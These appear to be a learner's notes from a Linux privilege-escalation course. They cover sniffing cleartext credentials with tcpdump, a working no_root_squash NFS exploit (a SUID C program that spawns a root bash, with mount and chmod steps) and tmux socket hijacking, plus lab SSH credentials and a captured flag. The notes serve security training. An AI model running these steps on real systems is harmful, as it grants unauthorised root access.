# Miscellaneous Techniques

## Passive Traffic Capture

If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. 

It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password.

Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

## Weak NFS Privileges

showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *

When an NFS volume is created, various options can be set:

- root_squash : If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user
--> it prevents prevents an attacker from uploading binaries with the SUID bit set.

- no_root_squash : Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user

cat /etc/exports

/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)

Create a SETUID binary that executes /bin/sh using our local root user

cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

gcc shell.c -o shell

sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

On the targeted host :
./shell
id
uid=0(root) gid=0(root) groups=0(root)

## Hijacking Tmux Sessions

Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session.

tmux -S /shareds new -s debugsess
chown root:devs /shareds

ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess


ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds

id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)

## LAB

ssh htb-student@10.129.220.117
Academy_LLPE!

showmount -e 10.129.220.117
Export list for 10.129.220.117:
/tmp             *
/var/nfs/general *

ls -l /tmp/
total 12
drwx------ 3 root root 4096 Jan 24 20:10 systemd-private-1cadb203e1f04f01a4d8f8a542e7cca7-systemd-timesyncd.service-BZok5Q
drwxrwxrwt 2 root root 4096 Jan 24 20:10 VMwareDnD
drwx------ 2 root root 4096 Jan 24 20:10 vmware-root

ls -m /var/nfs/general
exports_flag.txt

cat /var/nfs/general/exports_flag.txt
fc8c065b9384beaa162afe436a694acf